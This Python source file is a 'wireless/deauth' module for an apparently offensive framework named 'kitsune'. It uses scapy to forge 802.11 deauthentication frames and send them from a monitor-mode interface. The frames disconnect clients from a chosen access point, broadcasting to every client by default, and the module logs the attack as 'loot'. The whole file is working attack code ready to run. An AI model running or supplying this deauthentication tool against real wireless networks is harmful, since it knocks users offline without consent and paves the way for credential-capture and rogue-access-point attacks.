"""wireless/deauth — mdk4/aireplay-style deauth через scapy (требует monitor mode)."""

from kitsune import db
from kitsune.framework import Module

try:
    from scapy.all import Dot11, Dot11Deauth, RadioTap, sendp

    HAVE_SCAPY = True
except ImportError:
    HAVE_SCAPY = False

BROADCAST = "ff:ff:ff:ff:ff:ff"


class Module(Module):
    meta = {
        "name": "wireless/deauth",
        "author": "kitsune",
        "description": "Send deauth frames to kick clients off AP (scapy, monitor mode required)",
        "options": {
            "iface":  {"default": "wlan0mon", "required": True, "desc": "interface in monitor mode"},
            "bssid":  {"default": "", "required": True, "desc": "target AP MAC"},
            "client": {"default": "broadcast", "required": False, "desc": "client MAC or 'broadcast'"},
            "count":  {"default": "10", "required": False, "desc": "deauth frames to send"},
        },
    }

    def run(self):
        if not HAVE_SCAPY:
            self.fail("scapy not installed: pip3 install scapy")
            return

        client = BROADCAST if self.client.lower() in ("broadcast", "all", "") else self.client
        reason = 7  # "Class 3 frame from nonassociated station"

        frame = (RadioTap()
                 / Dot11(addr1=client, addr2=self.bssid, addr3=self.bssid)
                 / Dot11Deauth(reason=reason))

        self.warn(f"deauth {self.bssid} <- client {client} via {self.iface}")
        try:
            sent = sendp(frame, iface=self.iface, count=int(self.count), inter=0.2, verbose=False)
        except (OSError, PermissionError) as e:
            self.fail(f"send failed (нужен root + monitor mode): {e}")
            return

        db.add_loot("action", self.iface,
                    f"deauth {self.count} frames from {client} toward {self.bssid}")
        self.ok(f"{int(self.count)} deauth frame(s) sent, logged in db")
